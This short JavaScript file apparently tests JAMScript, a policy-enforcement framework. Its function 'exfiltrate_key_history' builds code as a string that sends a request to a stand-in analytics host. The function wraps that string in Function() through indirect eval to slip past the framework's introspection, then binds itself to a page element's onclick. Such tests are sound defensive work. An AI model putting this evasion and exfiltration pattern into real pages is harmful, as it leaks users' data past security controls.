function exfiltrate_key_history() {
  var exp = 'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=dynamic", true);xmlhttp.send(null);';
  if(JAMScript.isEval(eval)) {
    eval("introspect(JAMScript.introspectors.processAll) { " + "var sneaky = Function(exp)" + " }")
  }else {
    JAMScript.call(eval, null, ["var sneaky = Function(exp)"])
  }
  JAMScript.call(sneaky, null, []);
  return
}
var v0 = document.getElementById("test");
JAMScript.set(v0, "onclick", exfiltrate_key_history);

